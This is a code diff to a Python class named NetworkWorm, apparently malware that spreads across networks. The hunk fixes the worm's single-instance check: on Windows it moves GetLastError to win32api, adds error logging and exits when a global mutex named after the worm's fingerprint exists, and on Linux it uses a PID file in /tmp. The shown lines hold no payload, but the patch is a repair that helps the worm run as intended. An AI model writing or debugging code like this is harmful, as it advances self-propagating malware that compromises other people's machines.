@@ -305,9 +305,17 @@ class NetworkWorm:
         # Windows: Use mutex; Linux: Use PID file
         if os.name == 'nt':
             import win32event
-            self.mutex = win32event.CreateMutex(None, False, f"Global\\{self.fingerprint}")
-            if win32event.GetLastError() == 183:  # Already exists
-                sys.exit(0)
+            import win32api  # Correct module import
+            try:
+                self.mutex = win32event.CreateMutex(None, False, f"Global\\{self.fingerprint}")
+                # Get error code using correct module
+                last_error = win32api.GetLastError()
+                if last_error == 183:  # ERROR_ALREADY_EXISTS
+                    logging.info("Another instance is already running")
+                    sys.exit(0)
+            except Exception as e:
+                logging.error(f"Mutex creation failed: {str(e)}")
+                sys.exit(1)
         else:
             pid_file = Path(f"/tmp/{self.fingerprint}.pid")
             if pid_file.exists():
